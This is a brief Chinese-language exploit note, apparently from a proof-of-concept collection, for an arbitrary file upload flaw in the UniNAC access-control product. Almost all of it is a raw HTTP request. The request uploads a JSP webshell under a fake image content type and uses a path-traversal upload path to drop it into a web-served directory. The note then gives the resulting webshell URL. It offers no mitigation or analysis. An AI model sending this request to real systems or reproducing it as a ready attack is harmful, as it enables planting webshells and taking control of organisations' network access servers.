# 联软准入UniNAC 任意文件上传

影响版本：
- 未知

poc：
```
POST /uai/download/uploadfileToPath.htm HTTP/1.1

HOST: xxxxx

-----------------------------570xxxxxxxxx6025274xxxxxxxx1

Content-Disposition: form-data; name="input_localfile"; filename="webshell.jsp"

Content-Type: image/png

<%@page webshell%>

-----------------------------570xxxxxxxxx6025274xxxxxxxx1

Content-Disposition: form-data; name="uploadpath"

../webapps/notifymsg/devreport/-----------------------------570xxxxxxxxx6025274xxxxxxxx1--
```

webshell地址：/notifymsg/devreport/webshell.jsp